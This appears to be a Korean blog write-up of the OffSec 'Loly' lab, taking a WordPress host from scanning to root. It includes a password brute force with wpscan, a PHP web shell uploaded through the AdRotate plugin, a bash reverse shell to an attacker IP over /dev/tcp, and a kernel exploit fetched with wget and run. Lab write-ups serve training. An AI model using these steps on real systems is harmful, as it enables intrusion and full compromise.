---
title: "Loly Writeup"
date: 2025-09-09T00:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Loly Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Enumeration

### Nmap

command
```shell
sudo nmap -p- -T4 target
```

result
```shell
Nmap scan report for target (192.168.204.121)
Host is up (0.20s latency).
Not shown: 65508 closed tcp ports (reset), 26 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```
- 오픈된 포트는 80 하나입니다.

### Gobuster

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt
```

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 194] [--> http://target/wordpress/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
* gobuster enumeration 결과 `wordpress`로의 접근이 가능함을 확인했습니다.


command
```shell
gobuster dir -u http://target/wordpress -w /usr/share/wordlists/dirb/big.txt
```

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-admin             (Status: 301) [Size: 194] [--> http://target/wordpress/wp-admin/]
/wp-content           (Status: 301) [Size: 194] [--> http://target/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 194] [--> http://target/wordpress/wp-includes/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
- `/wordpress` 에 대해 한번 더 디렉토리 bruteforcing을 한 결과입니다.


## Exploitation
![loly-1](images/loly/loly-1.png)
- enumeration 단계 에서 얻은 정보로 웹페이지에 접근하면 `loly.lc`로 리다이렉트를 시켜버립니다.
- `/etc/hosts`를 수정하여 `loly.lc`를 타겟 머신의 ip와 맵핑합니다.

### wpscan

command
``` shell
wpscan --url http://loly.lc/wordpress/ --enumerate u --detection-mode mixed
```

result
```shell
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <======================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] loly
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] A WordPress Commenter
 | Found By: Rss Generator (Passive Detection)

```
* wpscan을 통한 user enumeration을 한 결과 `loly`라는 유저가 발견되었습니다.

command
```shell
wpscan --url http://loly.lc/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames loly --detection-mode aggressive
```

result
```shell
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - loly / fernando
Trying loly / corazon Time: 00:00:07 <                                      > (175 / 14344567)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: loly, Password: fernando

```
- loly 유저에 대해 패스워드 크래킹 공격을 하여 `fernando`라는 비밀번호를 발견하였습니다.

### File upload vulnerability
![loly-2](images/loly/loly-2.png)
- admin 대시보드에서 AdRotate라고 하는 광고 배너 표시 플러그인이 설치되어 있는 것을 확인할 수 있었습니다.
- 배너 파일을 업로드할 수 있는데, `.zip`파일을 업로드하면 자동으로 압축이 해제되면서 업로드된다고 설명되어 있습니다.
- RCE를 하는 php파일을 압축하여 업로드하면 파일 확장자 제한을 우회할 수 있습니다.


```
http://loly.lc/wordpress/wp-content/banners/rce.php?cmd=CMD
```
- 위 url 요청을 통해 arbitrary command를 실행할 수 있습니다.

### Reverse Shell
```shell
nc -nvlp 4444
```

```
GET /wordpress/wp-content/banners/rce.php?cmd=bash%20-c%20%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.45.231%2F4444%200>%261%27 HTTP/1.1

Host: loly.lc

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_6cbd66145d405532f25f0b0c2e6ebf30=loly%7C1757562381%7CerD1JhVkyCAxaD2DfjvXAN8JonGgYrK9DnVV6EObfQT%7C473b55a268c0d91de1fd1a9337663ba3312eb7ab7bee289c886fe5b015893848; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do; wp-settings-time-1=1757389591

Connection: keep-alive
```
- 로그인 쿠키 정보가 필요하기 때문에 burp를 통해 reverse shell을 획득합니다.

## Privilige Escalation
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- 새로운 shell 세션을 얻어냅니다.

### OS version enumeration
```shell
lsb_release -a

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial
```

```shell
uname -a

Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
- 커널 버전이 `4.4.0`임을 확인할 수 있습니다.

```shell
searchsploit kernel 4.4.0

...
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bound | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Cond | windows_x86-64/local/47170.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                        | linux/local/41886.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service      | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                      | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                           | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
...
```
- `Ubuntu 16.04`, 커널 버전 `4.13.9` 이하인 시스템에서 Privilege Escalation이 가능함을 확인했습니다.

[Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation - Linux local Exploit](https://www.exploit-db.com/exploits/45010)

### local exploitation
```shell
gcc 45010.c -static -o exploit

sudo python3 -m http.server 80
```
- 메인 kali 머신에서 exploit을 빌드하고, http 서버를 실행합니다.

```shell
wget http://192.168.45.231/exploit
chmod +x exploit
./exploit
```
- 타겟 머신에서 exploit을 받아온 후 실행합니다.

